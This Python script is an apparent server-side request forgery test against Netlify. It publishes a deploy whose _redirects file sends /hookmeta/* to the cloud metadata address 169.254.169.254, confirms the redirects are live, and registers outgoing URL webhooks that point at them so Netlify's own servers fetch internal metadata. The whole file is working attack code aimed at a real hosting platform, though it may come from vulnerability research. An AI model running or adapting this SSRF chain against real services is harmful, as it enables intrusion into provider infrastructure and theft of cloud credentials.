# -*- coding: utf-8 -*-
# _hk_redir_setup.py - B: zip deploy w/ _redirects 302 (metadata + control), verify, then hooks
import sys, os, io, json, zipfile, time, hashlib, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_B

SITE_B = "d2977de0-d24d-4544-81cb-933e610cad7d"
SITE_B_DOMAIN = "sec-b-08v4pk.netlify.app"
API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(40000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1000]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:300]

# build files
html = b"<html><body>hooktest-2026</body></html>"
redir = b"/hookmeta/*  https://169.254.169.254/latest/meta-data/  302\n/hookctl/*  /index.html  302\n"
files = {
    "/index.html": hashlib.sha1(html).hexdigest(),
    "/_redirects": hashlib.sha1(redir).hexdigest(),
}

# 1. create deploy with manifest
s, d = req("POST", API + "/sites/%s/deploys" % SITE_B, tok=TOKEN_B,
           body={"title": "hook-redir-test", "files": files})
print("create deploy:", s, (d.get("id"), d.get("state")) if isinstance(d, dict) else repr(d)[:300])
if not (isinstance(d, dict) and d.get("id")):
    sys.exit(1)
DID = d["id"]

# 2. upload files
for path, content in (("/index.html", html), ("/_redirects", redir)):
    s, r = req("PUT", API + "/deploys/%s/files%s" % (DID, path), tok=TOKEN_B,
               raw_body=content, ctype="application/octet-stream")
    print("PUT file %s:" % path, s, repr(r)[:150])

# 3. publish
s, dd = req("PUT", API + "/sites/%s/deploys/%s" % (SITE_B, DID), tok=TOKEN_B, body={"state": "published"})
print("publish:", s, "state:", dd.get("state") if isinstance(dd, dict) else repr(dd)[:200])

# 4. wait & verify redirects live
time.sleep(4)
for p in ("/hookctl/x", "/hookmeta/x"):
    try:
        rq = urllib.request.Request("https://" + SITE_B_DOMAIN + p, method="GET")
        # no redirect follow
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k):
                return None
        op = urllib.request.build_opener(NoRedirect)
        try:
            with op.open(rq, timeout=15) as resp:
                print("GET %s -> %s" % (p, resp.status))
        except urllib.error.HTTPError as e:
            print("GET %s -> %s (Location: %s)" % (p, e.code, e.headers.get("Location")))
    except Exception as ex:
        print("GET %s ERR %s" % (p, str(ex)[:150]))

# 5. create hooks (url type) - metadata target + control
h_meta, h_ctl = None, None
for name, target in (("meta", "https://%s/hookmeta/x" % SITE_B_DOMAIN),
                     ("ctl", "https://%s/hookctl/x" % SITE_B_DOMAIN)):
    s, h = req("POST", API + "/hooks?site_id=%s" % SITE_B, tok=TOKEN_B,
               body={"type": "url", "data": {"url": target}})
    print("create hook %s:" % name, s, json.dumps(h, ensure_ascii=False)[:300] if isinstance(h, (dict, list)) else repr(h)[:200])
    if isinstance(h, dict) and h.get("id"):
        if name == "meta":
            h_meta = h["id"]
        else:
            h_ctl = h["id"]

# save ids
open(r"D:\scan\netlify_report\_hk_ids.txt", "w").write(json.dumps({"deploy": DID, "meta": h_meta, "ctl": h_ctl}))
print("saved ids:", DID, h_meta, h_ctl)
